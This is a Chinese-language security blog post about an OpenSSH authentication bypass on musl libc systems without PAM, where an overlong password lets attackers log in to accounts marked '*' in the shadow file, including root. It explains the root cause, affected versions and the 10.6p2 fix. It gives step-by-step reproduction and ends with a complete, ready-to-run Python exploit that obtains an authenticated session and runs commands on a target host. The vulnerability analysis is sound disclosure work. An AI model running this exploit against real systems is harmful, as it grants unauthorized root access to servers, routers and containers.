#  【大洞速修】OpenSSH/musl 密码认证绕过漏洞！  
原创 ChinaRan404
                    ChinaRan404  知攻善防实验室   2026-11-06 01:42  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXHygGiatdM46jNhk2EDUkddF8vsm318YZOP35u9Sh3pmVPCA3RRHn5HtrD7rlozYXohTbibcp0c0FK8F16g5St7YNBTSTUUJ8eFc/640?wx_fmt=gif&from=appmsg "")  
  
前言  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXEZ1YeusKDK5xb155rHctZKEiaWtLHSf8K5pkn8wyriaOUswCiczvhy4Zx55w7BpIl1LsNHn7ECvLbz9SiaM04HsIerOmYSnUtuI3w/640?wx_fmt=gif&from=appmsg "")  
  
  
musl 无 PAM 下，* 账户被 257–1024 字节超长口令绕过密码认证，可直取 root。  
  
要点：musl 的 crypt() 遇超长口令返回 "*"，与 shadow 里的 "*" 相等；首次借盐失败一次后即可通过。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXGIBqjiccMDGuuiavIQDOpKzvVHicq3aicMgG2TcXmKaWXQ2l4jx59wOYmUnLwexdXwaAOMAFicG7kzbavLPnGFGE2FjmtdGv1Ze7LA/640?wx_fmt=gif&from=appmsg "")  
  
漏洞成因  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXEjcDxtuutWxgEOt9gqMPIBP7trAiamJG3ww4adWB1CR2tPtDLAYpJyYutKd7zwQM36EMqWEXtMZdmWfSQLYr31xNfRicia0oVXmY/640?wx_fmt=gif&from=appmsg "")  
  
  
根因链：  
  
1) musl 的 crypt() 内部实现（crypt_sha512.c / crypt_md5.c / crypt_blowfish.c / crypt_des.c 的 __crypt_* 包装）失败时返回字符串 "*"，而 glibc/PAM 路径返回 NULL 或走 PAM。  
  
2) musl 的 sha256/sha512-crypt 有 KEY_MAX=256 的 DoS 保护，口令 >256 字节时加密必然失败，于是 crypt() 返回 "*"。  
  
3) sshd auth-passwd.c sys_auth_passwd()：账户 shadow 字段为 "*" 时 pw_password="*"，只有 1 个字符，于是不走自带 salt，而是 salt=NULL → xcrypt() → pick_salt() 借用机器上某个真实 "$6$..." 账户的算法前缀（实测借到 bob 的 "$6$BobSalt1$"）；最终用 strlen(pw_password) 无关的 strcmp(crypt(pw, borrowed_salt), "*") 做比较。256 字节时 crypt 正常返回真哈希，257~1024 字节则返回 "*"，与影子条目 "*" 相等 → 认证通过。  
  
4) 触发前需要一次“错误口令”尝试：pick_salt() 第一次运行会遍历 /etc/passwd 调用 getspnam()，musl 的 getspnam 使用静态缓冲区，会把 sys_auth_passwd 里 pw_password 指向的 "*" 覆盖（实测被覆盖成空串，strcmp=36），同时把借来的 salt 缓存到 static salt[32]。因此在同一连接内第一次正常密码失败后，第二次用 257~1024 字节口令即被接受。  
  
5) 上限 1024 来自 auth-passwd.c 的 MAX_PASSWORD_LEN。  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXFeQ54icS3eUBdPzYo5Y8844W8q9ZcEVt2psY8k7wyfBvoMFqq0R56UBOVLPdKqsaLyibVTjDu761ic326B5lwjlZSpyqHr00rSP0/640?wx_fmt=gif&from=appmsg "")  
  
影响场景  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXG9ke4Qa5nMpOYSjibMrC6ibSj2hUAvah2EicnxADib3BNXugn7F63TC6picm6Q47SAXu1VllhcFxMiak7erbJbkiaOMX9ssAicg8tUorI/640?wx_fmt=gif&from=appmsg "")  
  
  
 影响版本：2016 年以来至 10.6p2 之前，运行于 musl libc 且未启用 PAM 的 OpenSSH sshd（Alpine、OpenWrt、Buildroot、Yocto 及 musl Docker 镜像）  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXEY1jLQUm5aibsEbPRZrS71lVtEbZjLIibgXuwHXdUVMjjBvCMa7jVZFaUziaYOI8iaGBiasvaVuM2icia2UU2Kg2RekicIheNUjIO3PmA/640?wx_fmt=gif&from=appmsg "")  
  
复现步骤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXElSDjzWGXoJYC55vVyt8y9joEA3H8GcPe2AHu7EMr19IMSSGqC6vibaibGOgyG3AEb6a0FSyhPCgFIl0EQvLo5G56qfYW7MjR60/640?wx_fmt=gif&from=appmsg "")  
  
  
1) 准备 musl + 无 PAM 的 sshd（本实验：Alpine minirootfs 提供 musl/openssl，上游 openssh-10.6p1 源码 ./configure --without-pam 后编译，通过 musl 动态加载器直接在容器内运行，监听 127.0.0.1:2226）。  
  
2) 账户：/etc/shadow 中 root:* 、alice:*（仅密钥/锁定），bob 有真实 $6$ 哈希（供 pick_salt 借用）。  
  
3) sshd_config：PasswordAuthentication yes，PermitRootLogin yes（用于验证 root 场景），PerSourcePenalties no（避免实验被惩罚机制打断）。  
  
4) 同一 TCP 连接内发送两次 password 认证：第一次任意错误口令（触发 pick_salt() 并缓存 salt），第二次发送 257~1024 字节口令（如 300 个 'A'）。  
  
5) 服务器返回 SSH_MSG_USERAUTH_SUCCESS，取得 shell：python3 poc_sshhole.py 2226 root → uid=0(root)；对 alice 同样成功 → uid=1002(alice)。  
  
6) 对照：单次尝试、256 字节、1025 字节均被拒绝；打入 10.6p2 修复后全部被拒绝。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXG542awXmD4t5DqAtfBJIpfNnEQXy9AWicicPR3tChhFVzMo9MJTzhFenHArf7PIDwWfKal6qJStVOgicnAmAnLjdTlACcxJUBAF4/640?wx_fmt=gif&from=appmsg "")  
  
全链哨兵复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXEt9aFJ3pASaAs44xbqLaEqJ2l2EnTm5gCRktfgmGL1icXqXmV8Ug6z2rzGFPpGrGTAbeeZ9ia1tCZqic6WN7b6eia5ExHWwRodW2Q/640?wx_fmt=gif&from=appmsg "")  
  
  
 全链哨兵已第一时间复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a3etiafIAYXEFsfcnR0NMMdU9GJwrAIXibHYmO5RUVavEFTaaj1rXdHDGzk6PWagbNh72ZD4KsbczeX0WWgQgTR6JbLLRpBgbsBQj8yHxzXm8/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a3etiafIAYXF6c3HCK5zPnQMuqSwYoYNkicm3HGEAplsiak9oiacxiaicIMwwGMfy5vJPUnAJOwmhsnibohVUKoOKQFo8ia2Fk8zLDVVFPtThWPeibEA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/a3etiafIAYXHNiaRaAqTngEefmvfiaicXDYqk5zV6j1L26kRia1x4OUfA4Q4BJWTgGiavPl4vtYsx10myR03ahXAl6T1GY49yUmgD2rho1JtBV3GI/640?wx_fmt=gif&from=appmsg "")  
  
复现 POC  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/a3etiafIAYXG1fvNOZzwiagUT8YibpN7ZyRPavrFv7Hy8ed7TIyR2xep2UEib69E6YnqCPJLlGf8W79ibg3VfmFMgnyLxEblia0p6PbkWahwPEy2E/640?wx_fmt=gif&from=appmsg "")  
  
```
#!/usr/bin/env python3
"""
sshhole PoC — OpenSSH < 10.6p2 password authentication bypass on musl libc
with PAM disabled (Alpine / OpenWrt / Buildroot / Yocto / musl images).

usage:
  poc_sshhole.py <host> <port> <user> [password length]
  poc_sshhole.py 10.0.0.5 22 root            # default 300 bytes
  poc_sshhole.py 10.0.0.5 22 deploy 512

How it works (two password attempts, ONE connection):
  1. any wrong password  -> sshd runs pick_salt() and caches a real "$6$.."
     hash prefix borrowed from another account; side effect: it also
     clobbers sshd's static shadow buffer for this attempt.
  2. a 257..1024 byte password -> musl crypt() rejects keys > 256 bytes and
     returns "*", which compares equal to the "*" in /etc/shadow.

Server preconditions (checked by this script where possible):
  * sshd on musl, PAM disabled, PasswordAuthentication yes
  * target account exists and /etc/shadow holds exactly "*" for it
  * at least one other account with a real "$..." hash exists (borrowed salt)
  * MaxAuthTries >= 2 (default), root also needs PermitRootLogin yes

Note: an account locked with "!" is NOT affected (sshd rejects it as locked),
and neither is an account with a real password hash — this is a bypass of the
"no password at all" state, not a password cracker.
"""
import sys
import paramiko

argv = sys.argv[1:]
if len(argv) < 3:
    print(__doc__)
    sys.exit(2)
HOST = argv[0]
PORT = int(argv[1])
USER = argv[2]
length = int(argv[3]) if len(argv) > 3 else 300


def connect():
    t = paramiko.Transport((HOST, PORT))
    t.start_client(timeout=10)
    t.banner_timeout = 15
    return t


def attempt(t, password):
    try:
        t.auth_password(USER, password)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:                       # noqa: BLE001
        print(f"[!] transport error: {type(e).__name__}: {e}")
        return False


def run(t, cmd):
    ch = t.open_session()
    ch.exec_command(cmd)
    return ch.makefile("rb").read().decode(errors="replace").strip()


def main():
    t = connect()
    print(f"[*] {HOST}:{PORT}  server={t.remote_version}  user={USER}  pwlen={length}")

    # attempt 1: ordinary wrong password (primes pick_salt inside this sshd child)
    print("[*] attempt 1: wrong password -> ", end="", flush=True)
    if attempt(t, "sshhole-wrong-password"):
        print("ACCEPTED (unexpected, wrong password worked?)")
        return 1
    print("denied")

    # attempt 2: the bypass
    print(f"[*] attempt 2: {length} x 'A' -> ", end="", flush=True)
    if not attempt(t, "A" * length):
        print("denied -> not vulnerable (or precondition not met)")
        t.close()
        return 1
    print("ACCEPTED")
    print("[+] authenticated, command output:")
    for cmd in ("id", "uname -sr"):
        try:
            print("    " + cmd + ": " + run(t, cmd).replace("\n", " | "))
        except Exception as e:                   # noqa: BLE001
            print(f"    {cmd}: (failed: {e})")
    t.close()
    return 0


sys.exit(main())
```  
  
